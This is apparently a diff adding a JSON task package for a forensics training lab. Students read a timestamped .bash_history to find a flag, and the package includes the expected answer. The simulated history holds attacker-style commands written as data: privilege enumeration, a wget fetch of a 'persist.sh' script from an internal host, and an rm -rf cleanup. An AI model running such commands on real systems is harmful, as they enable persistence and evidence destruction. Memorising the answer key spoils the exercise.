@@ -1,0 +1,23 @@
+{
+  "id": "linux-shell-history",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{b4sh_h1st0ry_t1m3st4mp}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: история shell\n\nДан `.bash_history` с временными метками. Восстанови действия и найди флаг.\n\n1. `cat .bash_history`.\n2. Строки `#<sec>` — время; переведи `date -d @1710382061`.\n3. `grep nto .bash_history > found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/.bash_history",
+      "text": "#1710382000\nsudo -l\n#1710382012\ncat /etc/crontab\n#1710382055\nwget http://10.10.20.9/persist.sh -O /tmp/p.sh\n#1710382061\necho nto{b4sh_h1st0ry_t1m3st4mp} >> /tmp/.f\n#1710382070\nrm -rf /tmp/.f\n"
+    }
+  ]
+}
